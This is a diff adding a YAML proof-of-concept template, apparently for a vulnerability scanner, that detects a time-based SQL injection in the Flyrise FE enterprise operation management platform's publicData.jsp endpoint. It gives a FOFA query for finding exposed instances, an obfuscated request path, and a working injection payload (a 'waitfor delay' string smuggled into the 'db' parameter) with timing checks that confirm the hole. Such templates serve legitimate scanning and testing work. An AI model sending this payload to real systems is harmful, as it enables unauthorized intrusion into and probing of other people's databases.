@@ -1,0 +1,26 @@
+id: poc-yaml-flyrise-enterprise-operation-management-platform-publicdata-sqli
+info:
+  name: 飞企互联-FE企业运营管理平台 publicData.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: FE企业运营管理平台
+  fofa: app="飞企互联-FE企业运营管理平台"
+variables:
+  t1: random_int(5,8)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,"[]") &&
+
+    !contains(body,"<html") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
